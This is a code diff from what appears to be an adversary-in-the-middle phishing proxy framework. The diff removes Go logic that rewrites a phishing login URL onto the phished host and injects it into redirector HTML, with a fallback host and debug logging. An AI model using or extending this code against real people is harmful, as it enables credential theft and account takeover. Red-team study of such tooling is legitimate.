@@ -727,34 +727,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											body := string(html)
 											body = p.replaceHtmlParams(body, lure_url, &s.Params)
 
-											// inject phishing login URL for redirector to use
-											login_url := pl.GetLoginUrl()
-											log.Debug("redirector: login_url='%s'", login_url)
-											if lu, lerr := url.Parse(login_url); lerr == nil {
-												ph, ok := p.replaceHostWithPhished(lu.Host)
-												log.Debug("redirector: replaceHostWithPhished('%s') -> '%s' ok=%v", lu.Host, ph, ok)
-												if ok {
-													lu.Host = ph
-													final_url := lu.String()
-													log.Debug("redirector: injecting login_url='%s'", final_url)
-													body = strings.Replace(body, "{login_url}", final_url, -1)
-												} else {
-													// fallback: use landing phish host
-													landing_host := pl.GetLandingPhishHost()
-													log.Debug("redirector: fallback landing_host='%s'", landing_host)
-													if landing_host != "" {
-														final_url := "https://" + landing_host + lu.Path
-														log.Debug("redirector: injecting login_url='%s' (fallback)", final_url)
-														body = strings.Replace(body, "{login_url}", final_url, -1)
-													}
-												}
-											}
-
-											// verify the placeholder was replaced
-											if strings.Contains(body, "{login_url}") {
-												log.Warning("redirector: {login_url} placeholder was NOT replaced!")
-											}
-
 											log.Info("lure: serving redirector '%s' (html length: %d)", l.Redirector, len(body))
 											resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
 											if resp != nil {
